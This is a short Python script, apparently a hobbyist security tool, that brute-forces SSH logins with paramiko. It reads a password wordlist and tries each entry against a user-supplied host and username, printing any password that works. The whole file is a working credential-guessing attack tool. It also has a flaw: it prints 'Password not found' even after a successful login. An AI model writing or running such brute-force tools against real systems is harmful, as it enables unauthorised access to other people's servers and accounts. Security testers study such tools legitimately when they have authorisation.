import paramiko
from termcolor import colored

def ssh_login(hostname, port, username, password):
    # Create an SSH client
    client = paramiko.SSHClient()

    # Automatically add the server's host key (don't do it in production without verifying)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    success = False  # Flag to track successful login

    try:
        # Connect to the SSH server
        client.connect(hostname, port, username, password)

    except paramiko.AuthenticationException:
        # Failed login attempt
        print(colored(f"Failed login for {password} {username}@{hostname}", 'red'))

    else:
        # Successful login
        print(colored(f"Login successful for {username}@{hostname}", 'green'))
        print(colored(f"Password found: {password}", 'green'))
        success = True

    finally:
        # Close the SSH connection
        client.close()

    return success


def main():
    # SSH connection details
    hostname = input("Enter the hostname: ")
    port = 22
    username = input("Enter the username: ")
    password_list_path = input("Enter the path to the password list file: ")

    with open(password_list_path, 'r') as password_list_file:
        for line in password_list_file:
            password = line.strip()  # Remove leading/trailing whitespaces and line breaks
            if ssh_login(hostname, port, username, password):
                break  # Break out of the loop if successful login

    print("Password not found in the list.")


if __name__ == '__main__':
    main()
